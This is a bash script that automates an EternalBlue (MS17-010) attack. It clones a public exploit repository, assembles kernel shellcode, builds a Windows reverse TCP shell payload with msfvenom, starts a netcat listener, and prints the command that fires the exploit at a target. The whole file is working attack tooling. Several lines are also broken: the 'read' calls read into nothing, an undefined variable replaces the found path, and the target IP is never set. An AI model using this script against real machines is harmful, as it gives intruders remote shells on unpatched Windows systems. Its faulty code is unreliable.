#!/bin/bash

read $arch
read $IPAddr
read $localport

cd ~
git clone https://github.com/worawit/MS17-010.git

path=$(find -name "shellcode" | grep 'MS17-010')
match="/"
occurrence=$(grep -o "$match" <<< $var | wc -l)
dir=$(echo $var | cut -d"/" -f1-$occurrence)
cd $dir

payload=""
ASM=""
nonASM=""

if [[ $arch = 86 ]]; then
    payload="windows/shell_reverse_tcp";
    ASM="shellcode/eternalblue_kshellcode_x86.asm"
    nonASM="shellcode/eternalblue_kshellcode_x86"
else 
    payload="windows/x64/shell_reverse_tcp";
    ASM="shellcode/eternalblue_kshellcode_x64.asm"
    nonASM="shellcode/eternalblue_kshellcode_x64"
fi

nasm -f bin shellcode/eternalblue_kshellcode_x${arch}.asm 
msfvenom -p ${payload} -f raw -o meterpreter_msf.bin EXITFUNC=thread LHOST=${IPAddr} LPORT=${localport} 
cat $nonASM meterpreter_msf.bin > sc_x${arch}.bin 

screen -S MS17-010 -dm "nc -nlvp ${localport}"
sessionlist=$(screen -ls)

cmd="python eternalblue_exploit7.py ${targetIP} ${dir}/shellcode/sc_x${arch}.bin"
echo $'\n'
echo "[ + ]  Netcat Listener is UP and running in a screen session: "
echo $sessionlist
echo $'\n'
echo "[ + ]  Here's your command to execute:  ${cmd}"
